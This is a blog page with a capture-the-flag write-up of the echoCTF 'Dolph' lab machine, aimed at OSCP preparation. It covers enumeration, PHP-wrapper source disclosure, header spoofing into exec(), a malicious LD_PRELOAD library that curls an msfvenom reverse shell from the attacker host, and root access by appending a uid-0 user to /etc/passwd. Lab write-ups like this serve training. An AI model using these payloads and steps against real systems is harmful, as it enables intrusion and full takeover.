<!doctype html><html lang=en><head><title>echoCTF Dolph Writeup: Nginx to Root via LD_PRELOAD :: Hacking Blog</title>
<meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Crack Dolph on echoCTF with nginx enumeration, PHP wrappers, and LD_PRELOAD exploitation. Perfect for OSCP prep!"><meta name=keywords content="CTF,hacking,cybersecurity,notes,writeups"><meta name=robots content="noodp"><link rel=canonical href=https://hack.com.cy/writeups/echoctf/dolph/dolph/><link rel=stylesheet href=https://hack.com.cy/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css><link rel=stylesheet href=https://hack.com.cy/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css><link rel=stylesheet href=https://hack.com.cy/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css><link rel=stylesheet href=https://hack.com.cy/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css><link rel=stylesheet href=https://hack.com.cy/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css><link rel=stylesheet href=https://hack.com.cy/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css><link rel=stylesheet href=https://hack.com.cy/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css><link rel=stylesheet href=https://hack.com.cy/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css><link rel=stylesheet href=https://hack.com.cy/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css><link rel=stylesheet href=https://hack.com.cy/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css><link rel=stylesheet href=https://hack.com.cy/css/sidebar.min.d99f1331c4dc2becb305a3d135a35844adbf5c1f39330853456f7e7f5864cb45.css><link rel=stylesheet href=https://hack.com.cy/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css><link rel=stylesheet href=https://hack.com.cy/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css><link rel=stylesheet href=https://hack.com.cy/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css><link rel=stylesheet href=https://hack.com.cy/terminal.css><link rel=stylesheet href=https://hack.com.cy/style.css><link rel="shortcut icon" href=https://hack.com.cy/favicon.png><link rel=apple-touch-icon href=https://hack.com.cy/apple-touch-icon.png><meta name=twitter:card content="summary"><meta name=twitter:site content><meta name=twitter:creator content><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="echoCTF Dolph Writeup: Nginx to Root via LD_PRELOAD"><meta property="og:description" content="Crack Dolph on echoCTF with nginx enumeration, PHP wrappers, and LD_PRELOAD exploitation. Perfect for OSCP prep!"><meta property="og:url" content="https://hack.com.cy/writeups/echoctf/dolph/dolph/"><meta property="og:site_name" content="Hacking Blog"><meta property="og:image" content="https://hack.com.cy/og-image.png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:section" content="CTF"><meta property="article:section" content="OSCP Prep"><meta property="article:section" content="echoCTF"><meta property="article:published_time" content="2025-07-23 00:00:00 +0000 UTC"><meta name=theme-color content="#0a0e14"><meta name=color-scheme content="dark"><link rel=preload href=/fonts/FiraCode-Latin.woff2 as=font type=font/woff2 crossorigin><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><script src=https://cdn.jsdelivr.net/npm/fuse.js@6.6.2/dist/fuse.min.js></script><script defer src=https://hack.com.cy/js/search.js></script></head><body><div class="container center"><header class=header><div class=header__inner><div class=header__logo><a href=/why/><div class=logo><img src=/logo.png alt="Hacking Vault" class=logo-image></div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;▾</li><li><ul class=menu__dropdown><li><a href=/why/>Why</a></li><li><a href=/whoami/>Whoami</a></li><li><a href=/writeups/>Writeups</a></li><li><a href=/notes/>Notes</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/why/>Why</a></li><li><a href=/whoami/>Whoami</a></li><li><a href=/writeups/>Writeups</a></li><li><a href=/notes/>Notes</a></li><li><button class=search-button onclick=showSearch() aria-label=Search>Search</button></li></ul></nav></header><div class=content><nav class=breadcrumbs aria-label=Breadcrumb><ol class=breadcrumb-list><li class=breadcrumb-item><a href=https://hack.com.cy/ class=breadcrumb-link><span class=breadcrumb-icon>~</span>Home</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/writeups/ class=breadcrumb-link>echoCTF Writeups</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/writeups/echoctf/ class=breadcrumb-link>echoCTF Writeups</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/writeups/echoctf/dolph/ class=breadcrumb-link></a></li><li class=breadcrumb-separator>/</li><li class="breadcrumb-item breadcrumb-current" aria-current=page><span class=breadcrumb-text>echoCTF Dolph Writeup: Nginx to Root via LD_PRELOAD</span></li></ol></nav><style>.breadcrumbs{margin:20px 0 30px;padding:10px 15px;background:var(--background-secondary);border-left:3px solid var(--accent);border-right:1px solid var(--code-border);border-top:1px solid var(--code-border);border-bottom:1px solid var(--code-border)}.breadcrumb-list{display:flex;flex-wrap:wrap;align-items:center;list-style:none;margin:0;padding:0;gap:8px;font-size:.9rem}.breadcrumb-item{display:inline-flex;align-items:center}.breadcrumb-link{color:var(--accent-secondary);text-decoration:none;transition:all .2s ease;display:inline-flex;align-items:center;gap:5px}.breadcrumb-link:hover{color:var(--accent);text-shadow:0 0 5px var(--glow-accent)}.breadcrumb-icon{color:var(--accent);font-weight:700}.breadcrumb-separator{color:var(--code-border);user-select:none}.breadcrumb-current .breadcrumb-text{color:var(--foreground);font-weight:700}@media(max-width:684px){.breadcrumbs{font-size:.85rem;overflow-x:auto}.breadcrumb-list{flex-wrap:nowrap}}</style><article class=post><h1 class=post-title><a href=https://hack.com.cy/writeups/echoctf/dolph/dolph/>echoCTF Dolph Writeup: Nginx to Root via LD_PRELOAD</a></h1><div class=post-meta><time class=post-date>2025-07-23&nbsp;[Updated 2026-01-01]</time><span class=post-reading-time>4 min read (735 words)</span></div><span class=post-tags>#<a href=https://hack.com.cy/tags/nginx/>nginx</a>&nbsp;
#<a href=https://hack.com.cy/tags/ld_preload/>LD_PRELOAD</a>&nbsp;
#<a href=https://hack.com.cy/tags/php-wrapper/>PHP wrapper</a>&nbsp;
#<a href=https://hack.com.cy/tags/privilege-escalation/>privilege escalation</a>&nbsp;</span><div class=table-of-contents><h2>Contents</h2><nav id=TableOfContents><ul><li><a href=#video-walkthrough>Video Walkthrough</a></li></ul><ul><li><a href=#nmap>NMAP</a></li><li><a href=#output>Output</a></li></ul></nav></div><div class=post-content><div><h2 id=video-walkthrough>Video Walkthrough<a href=#video-walkthrough class=hanchor arialabel=Anchor>#</a></h2><div style=position:relative;padding-bottom:56.25%;height:0;overflow:hidden><iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen loading=eager referrerpolicy=strict-origin-when-cross-origin src="https://www.youtube.com/embed/k2FNSCH3DDg?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style=position:absolute;top:0;left:0;width:100%;height:100%;border:0 title="YouTube video"></iframe></div><p><a href="https://www.youtube.com/watch?v=k2FNSCH3DDg"><img src="https://img.shields.io/badge/Watch%20on-YouTube-red?logo=youtube" alt="Watch on YouTube"></a></p><h1 id=dolph>Dolph<a href=#dolph class=hanchor arialabel=Anchor>#</a></h1><h1 id=enumeration>Enumeration<a href=#enumeration class=hanchor arialabel=Anchor>#</a></h1><p>Start by port scanning the target machine.</p><h2 id=nmap>NMAP<a href=#nmap class=hanchor arialabel=Anchor>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap -nvv -p- -sC -sV -T4 10.0.50.1
</span></span></code></pre></div><h2 id=output>Output<a href=#output class=hanchor arialabel=Anchor>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>PORT   STATE SERVICE REASON         VERSION
</span></span><span class=line><span class=cl>80/tcp open  http    syn-ack ttl <span class=m>63</span> nginx 1.10.3
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  Supported Methods: GET HEAD
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Tmp uploader
</span></span></code></pre></div><p>It seems that there is an nginx 1.10.3 running on port 80</p><p><img src=/images/dolph1.png alt="Image Description"></p><p>Looking the source code we find a new directory called &ldquo;/admin&rdquo;.</p><p><img src=/images/dolph2.png alt="Image Description"></p><p>Lets check for more directories</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gobuster dir -u http://10.0.50.1/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o rsw.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/admin                <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 185<span class=o>]</span> <span class=o>[</span>--&gt; http://10.0.50.1/admin/<span class=o>]</span>
</span></span><span class=line><span class=cl>/uploads              <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 185<span class=o>]</span> <span class=o>[</span>--&gt; http://10.0.50.1/uploads/<span class=o>]</span>
</span></span><span class=line><span class=cl>/.                    <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 185<span class=o>]</span> <span class=o>[</span>--&gt; http://10.0.50.1/./<span class=o>]</span>
</span></span></code></pre></div><p>&ldquo;/admin&rdquo; it interesting lets check that as well</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gobuster dir -u http://10.0.50.1/admin/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o admin-rsw.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/login                <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 8696<span class=o>]</span>
</span></span></code></pre></div><p>When trying to visit &ldquo;/admin/login&rdquo; we download a a binary.</p><p>Before examining the binary we can manually check the functionality of the web uploader. During the testing i was not able to bypass the security mechanism regarding uploading scripts or a file containing a &ldquo;.&rdquo;</p><p>What i found out however is that several PHP wrappers work here so i was able to obtain the source code of the <code>index.php</code> and <code>/admin/index.php</code>. You can read and follow the following guide to understand how we could abuse PHP wrappers</p><p><a href=https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams>https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams</a></p><p>I used the following PHP wrapper to obtain the source code of index.php under the admin directory.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>php://filter/convert.base64-encode/resource<span class=o>=</span>/var/www/html/admin/index.php
</span></span></code></pre></div><p><img src=/images/dolph3.png alt="Image Description">
Then we can download it by visiting http://10.0.50.1/uploads/wrappersindex and then decoded it to see its contents.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat ~/Downloads/wrappersindex  <span class=p>|</span> base64 -d &gt; wrapperindex.php
</span></span></code></pre></div><p><img src=/images/dolph4.png alt="Image Description"></p><p>Reading the code, it seems that the PHP code retrieves the client’s IP address from HTTP headers, sets it as part of an environment variable, and passes it as an argument to a local <code>login</code> binary. It blocks IPs containing a single quote to prevent injection, but still allows IP spoofing via the <code>X-Forwarded-For</code> header, which can be abused to influence the environment and execution of the binary.</p><p>Also notice that the value of the header that we will be sending then gets processes with in the codes &ldquo;exec()&rdquo; function which is crucial! Moving on ..</p><p>When we visit &ldquo;/admin&rdquo; we get the following:
![Image Description](/images/Pasted image 20250811115147.png)</p><p>And when we try to run the &ldquo;login&rdquo; binary we g downloaded earlier we get the same thing back but when we specify 127.0.0.1 we are allowed.</p><p><img src=/images/dolph5.png alt="Image Description"></p><p>So by adding the X-Forwarded-For header on our request we should see the flag</p><p><img src=/images/dolph6.png alt="Image Description">
However even though we tricked the web application to believe that we are coming from 127.0.0.1 and executed the &ldquo;login&rdquo; binary which printed the flag how are we going to get access? &mldr;</p><p>Well by analyzing the PHP source code we obtained and the login binary we downloaded.</p><p>It is noticed that the binary running on the server accepts preloads. This was found by running the command <code>strace</code> on the binary.</p><p><img src=/images/dolph0.png alt="Image Description"></p><p>Following the article below we can crate and upload a malicious library on the server using the uploader feature, and then preload it using LD_PRELOAD command in the value of <code>X-Forwarded-For</code> and since the value of the header gets processed by exec() we might be able to get execution.</p><p><a href=https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/>https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/</a></p><h1 id=exploitation>Exploitation<a href=#exploitation class=hanchor arialabel=Anchor>#</a></h1><p>Create a reverse shell using <code>msfvenom</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo msfvenom -p linux/x64/shell_reverse_tcp <span class=nv>LHOST</span><span class=o>=</span>10.10.11.150 <span class=nv>LPORT</span><span class=o>=</span><span class=m>80</span> -f elf -o rev
</span></span></code></pre></div><p>Create a malicious .so file using the guide provided above</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>cat</span> <span class=n>shell</span><span class=p>.</span><span class=n>c</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=kt>void</span> <span class=nf>_init</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=nf>unsetenv</span><span class=p>(</span><span class=s>&#34;LD_PRELOAD&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>system</span><span class=p>(</span><span class=s>&#34;curl http://10.10.11.150/rev -O /tmp/rev&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Compiling <code>.c</code> to <code>.so</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gcc -fPIC -shared -o shell.so shell.c -nostartfiles
</span></span></code></pre></div><p>Now lets upload our .so file uisng the download service of the server, even though the we cannot append the .so, it still works.</p><p><img src=/images/dolph7.png alt="Image Description"></p><p><img src=/images/dolph8.png alt="Image Description"></p><p>We have code execution! we managed to upload our reverse shell to the target machine, now we have to make it executable and execute following the same process!</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>cat</span> <span class=n>shell</span><span class=p>.</span><span class=n>c</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=kt>void</span> <span class=nf>_init</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=nf>unsetenv</span><span class=p>(</span><span class=s>&#34;LD_PRELOAD&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>system</span><span class=p>(</span><span class=s>&#34;chmod +/tmp/rev&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gcc -fPIC -shared -o shell.so shell.c -nostartfiles
</span></span></code></pre></div><p>![Image Description](/images/Pasted image 20250811124702.png)</p><p>We got shell as www-data</p><h1 id=privilege-escalation>Privilege Escalation<a href=#privilege-escalation class=hanchor arialabel=Anchor>#</a></h1><p>Lets upgrade our shell using python</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 -c <span class=s1>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>CTRL + Z
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>stty raw -echo<span class=p>;</span><span class=nb>fg</span>
</span></span><span class=line><span class=cl><span class=o>(</span>Press Enter<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>Press Enter<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>Press Enter<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span></code></pre></div><p>Upload and run linpeas.sh reveals tha the &lsquo;/etc/passwd&rsquo; is writable!</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>wget http://10.10.11.150/linpeas.sh -O /tmp/linpeas.sh
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>chmod +x /tmp/linpeas.sh
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/tmp/linpeas.sh
</span></span></code></pre></div><p><img src=/images/dolph9.png alt="Image Description"></p><p>So we can create our own password and add a new user as root!</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># On kali</span>
</span></span><span class=line><span class=cl>openssl passwd d0tpirate
</span></span><span class=line><span class=cl><span class=nv>$1$UaM3ZY23$Xf5rURx8KjC1vT</span>/9pNQmw.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># On Target</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s1>&#39;root2:$1$UaM3ZY23$Xf5rURx8KjC1vT/9pNQmw.:0:0:root:/root:/bin/bash&#39;</span> &gt;&gt; /etc/passwd
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>su root2
</span></span><span class=line><span class=cl><span class=o>(</span>d0tpirate<span class=o>)</span>
</span></span></code></pre></div><p><img src=/images/dolph10.png alt="Image Description"></p><p>ROOT!</p></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2026 Powered by <a href=https://gohugo.io>Hugo</a></span>
<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script><div id=search-overlay><div class=search-container><input type=search id=search-input placeholder="Search writeups, notes, and more..." autocomplete=off aria-label=Search><div class=search-hint>Press <kbd>ESC</kbd> to close or <kbd>/</kbd> to open search</div><div id=search-results></div></div><button class=search-close onclick=hideSearch() aria-label="Close search">×</button></div></div></body></html>